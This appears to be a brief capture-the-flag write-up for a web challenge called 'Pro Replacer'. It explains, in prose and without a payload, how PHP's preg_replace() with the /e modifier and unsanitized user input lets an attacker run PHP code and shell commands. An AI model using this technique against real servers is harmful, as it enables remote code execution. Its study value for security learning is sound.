# Name: Web: Exotic Attacks: Pro Replacer

## Vulnerability

Use of `preg_replace()` function in PHP 5.5 that leads to command injection.

## Exploit

The server executes the `preg_replace()` function with unsanitized parameters from the user.

If you use the `/e` modifier at the end of the regex, the next of the command will be treated as PHP code.
In this way you can execute shell commands.
